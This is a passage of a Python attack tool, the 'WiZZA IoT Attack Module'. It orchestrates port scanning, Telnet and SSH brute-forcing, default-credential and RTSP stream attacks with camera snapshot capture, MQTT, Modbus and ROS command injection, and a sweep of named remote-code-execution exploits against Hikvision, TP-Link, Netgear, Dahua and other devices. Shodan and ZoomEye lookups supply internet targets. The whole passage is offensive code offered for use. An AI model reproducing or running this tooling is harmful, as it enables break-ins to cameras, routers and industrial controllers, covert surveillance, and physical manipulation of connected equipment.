            if zy_ports:
                print(f"[*] ZoomEye known ports: {sorted(zy_ports)}")

    # Optional: Shodan enrichment
    if api_key:
        host_info = shodan_host(ip, api_key)
        if host_info:
            result["shodan"] = host_info
            shodan_ports = set(host_info.get("ports", []))
            if shodan_ports:
                print(f"[*] Shodan known ports: {sorted(shodan_ports)}")

    # Phase 1: TCP port scan
    probe_ports = ports or EXTERNAL_IOT_PORTS
    print(f"\n[*] Phase 1: Port scan  ({len(probe_ports)} ports)...")
    open_ports = set()
    for port in probe_ports:
        if _tcp_connect(ip, port, timeout=3):
            open_ports.add(port)
            banner = _tcp_banner(ip, port, timeout=3).strip()[:120]
            print(f"  [OPEN] {ip}:{port}  {banner}")
    result["ports"] = sorted(open_ports)

    if not open_ports:
        print(f"[-] No open ports found on {ip}")
        return result

    dtype = _guess_device_type(ip, open_ports)
    result["type"] = dtype
    print(f"\n[*] Guessed device type: {dtype}")
    print(f"[*] Phase 2: Service attacks...\n")

    # Telnet brute
    for p in (23, 2323):
        if p in open_ports:
            cred = telnet_brute(ip, port=p)
            if cred:
                result["findings"].append(f"Telnet {cred[0]}:{cred[1]}")

    # SSH brute
    if 22 in open_ports:
        cred = ssh_brute(ip)
        if cred:
            result["findings"].append(f"SSH {cred[0]}:{cred[1]}")

    # HTTP default creds
    for p in (80, 8080, 8000, 443, 8443):
        if p in open_ports:
            https = p in (443, 8443)
            cred = camera_default_creds(ip, port=p, https=https)
            if cred:
                result["findings"].append(f"HTTP:{p} {cred[0]}:{cred[1]}")
            onvif = onvif_probe(ip, port=p)
            if onvif:
                result["findings"].append(f"ONVIF:{p} {onvif.get('manufacturer','')} {onvif.get('model','')}")

    # RTSP
    if 554 in open_ports:
        streams = rtsp_brute(ip, port=554)
        for url in streams:
            result["findings"].append(f"RTSP: {url}")
            snap = capture_rtsp_snapshot(url,
                out_file=f"{out_dir}/wizza_ext_{ip.replace('.','_')}.jpg")
            if snap:
                result["findings"].append(f"Snapshot: {snap}")

    # MQTT
    if 1883 in open_ports:
        if mqtt_probe(ip, port=1883):
            result["findings"].append("MQTT open (no auth)")
            mqtt_attack(ip, port=1883)

    # MQTT TLS
    if 8883 in open_ports:
        if mqtt_probe(ip, port=8883):
            result["findings"].append("MQTT TLS open")

    # CoAP
    if 5683 in open_ports:
        resp = coap_scan(ip)
        if resp:
            result["findings"].append(f"CoAP: {resp[:100]}")

    # Modbus
    if 502 in open_ports:
        regs = modbus_scan(ip)
        if regs:
            result["findings"].append(f"Modbus registers: {regs[:5]}")

    # BACnet
    if 47808 in open_ports:
        result["findings"].append("BACnet port open (building automation)")

    # ROS
    if 11311 in open_ports:
        ros_scan(ip)
        result["findings"].append("ROS XMLRPC port open")

    # CVE sweep — try all regardless of banner (external devices often have
    # stripped banners or reverse proxy that hides product name)
    print(f"\n[*] Phase 3: CVE sweep...")
    for fn, label in [
        (cve_hikvision_rce,    "CVE-2021-36260 Hikvision"),
        (cve_tplink_rce,       "CVE-2023-1389 TP-Link"),
        (cve_tenda_rce,        "CVE-2020-10987 Tenda"),
        (cve_netgear_rce,      "CVE-2021-40847 Netgear"),
        (cve_axis_rce,         "CVE-2018-10660 AXIS"),
        (cve_geutebruck_rce,   "CVE-2021-33544 Geutebruck"),
    ]:
        if any(p in open_ports for p in (80, 8080, 443, 8443)):
            try:
                fn(ip)
            except Exception:
                pass

    if 37777 in open_ports:
        cve_dahua_auth_bypass(ip, port=37777)

    if result["findings"]:
        print(f"\n[+] Findings for {ip}:")
        for f in result["findings"]:
            print(f"    {f}")
    else:
        print(f"\n[-] No vulnerabilities found on {ip}")

    out_file = f"{out_dir}/wizza_ext_{ip.replace('.','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(out_file, "w") as fh:
        json.dump(result, fh, indent=2)
    print(f"[+] Results saved: {out_file}")
    return result


# ─────────────────────────────────────────────────────────────────────────────
# Module entry point
# ─────────────────────────────────────────────────────────────────────────────

def run(action, **kwargs):
    actions = {
        "auto":         auto_attack,
        "scan":         scan_subnet,
        "ssdp":         ssdp_scan,
        "mdns":         mdns_scan,
        "rtsp":         rtsp_brute,
        "rtsp_snap":    capture_rtsp_snapshot,
        "rtsp_video":   capture_rtsp_video,
        "onvif":        onvif_probe,
        "telnet_brute": telnet_brute,
        "ssh_brute":    ssh_brute,
        "mqtt":         mqtt_attack,
        "mqtt_dump":    mqtt_dump_topics,
        "mqtt_inject":  mqtt_inject,
        "upnp_map":     upnp_port_map,
        "modbus":       modbus_scan,
        "modbus_write": modbus_write,
        "coap":         coap_scan,
        "hue":          philips_hue_attack,
        "lifx":         lifx_attack,
        "tuya":         tuya_local_attack,
        "ros":          ros_scan,
        "ros2":         ros2_scan,
        "ros_inject":   ros_inject_velocity,
        "cam_creds":    camera_default_creds,
        "hikvision_rce": cve_hikvision_rce,
        "tplink_rce":   cve_tplink_rce,
        "netgear_rce":  cve_netgear_rce,
        "tenda_rce":    cve_tenda_rce,
        "axis_rce":     cve_axis_rce,
        "geutebruck_rce": cve_geutebruck_rce,
        "dahua_bypass": cve_dahua_auth_bypass,
        "external":     external_attack,
        "shodan":       shodan_search,
        "shodan_host":  shodan_host,
        "zoomeye":      zoomeye_search,
        "zoomeye_host": zoomeye_host,
    }
    if action not in actions:
        print(f"[!] Unknown action: {action}")
        print(f"    Available: {', '.join(sorted(actions))}")
        return
    return actions[action](**kwargs)


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="WiZZA IoT Attack Module")
    p.add_argument("action")
    p.add_argument("--subnet",  default="192.168.1.0/24")
    p.add_argument("--ip",      default=None)
    p.add_argument("--port",    type=int, default=None)
    p.add_argument("--topic",   default="#")
    p.add_argument("--payload", default="ON")
    p.add_argument("--out",     default="/tmp")
    p.add_argument("--duration", type=int, default=30)
    p.add_argument("--cmd",     default="id")
    p.add_argument("--query",      default="cameras")
    p.add_argument("--apikey",     default="")
    p.add_argument("--zoomeyekey", default="")
    p.add_argument("--limit",      type=int, default=100)
    p.add_argument("--country",    default=None)
    args = p.parse_args()

    ip = args.ip or args.subnet.split("/")[0].rsplit(".",1)[0] + ".1"

    if args.action == "auto":
        auto_attack(args.subnet, out_dir=args.out)
    elif args.action == "scan":
        devs = scan_subnet(args.subnet)
        print_scan_results(devs)
    elif args.action == "ssdp":
        devs = ssdp_scan()
        for d in devs:
            print(f"  {d['ip']}  {d['server']}  {d['location']}")
    elif args.action == "rtsp":
        rtsp_brute(ip, port=args.port or 554)
    elif args.action == "mqtt":
        mqtt_attack(ip, port=args.port or 1883)
    elif args.action == "mqtt_inject":
        mqtt_inject(ip, port=args.port or 1883, topic=args.topic,
                    payload=args.payload)
    elif args.action == "modbus":
        modbus_scan(ip, port=args.port or 502)
    elif args.action == "ros":
        ros_scan(ip)
    elif args.action == "hue":
        philips_hue_attack(ip)
    elif args.action == "lifx":
        lifx_attack()
    elif args.action == "hikvision_rce":
        cve_hikvision_rce(ip, cmd=args.cmd)
    elif args.action == "tplink_rce":
        cve_tplink_rce(ip)
    elif args.action == "tenda_rce":
        cve_tenda_rce(ip)
    elif args.action == "mdns":
        mdns_scan(duration=args.duration)
    elif args.action == "coap":
        coap_scan(ip, port=args.port or 5683)
    elif args.action == "external":
        if not args.ip:
            print("[!] --ip required for external attack")
        else:
            external_attack(args.ip, out_dir=args.out,
                            api_key=args.apikey or None,
                            zoomeye_key=args.zoomeyekey or None)
    elif args.action == "shodan":
        shodan_search(args.query, args.apikey, limit=args.limit, country=args.country)
    elif args.action == "shodan_host":
        if not args.ip:
            print("[!] --ip required for shodan_host")
        else:
            shodan_host(args.ip, args.apikey)
    elif args.action == "zoomeye":
        zoomeye_search(args.query, args.zoomeyekey, limit=args.limit, country=args.country)
    elif args.action == "zoomeye_host":
        if not args.ip:
            print("[!] --ip required for zoomeye_host")
        else:
            zoomeye_host(args.ip, args.zoomeyekey)
    else:
        print(f"Unknown action: {args.action}")
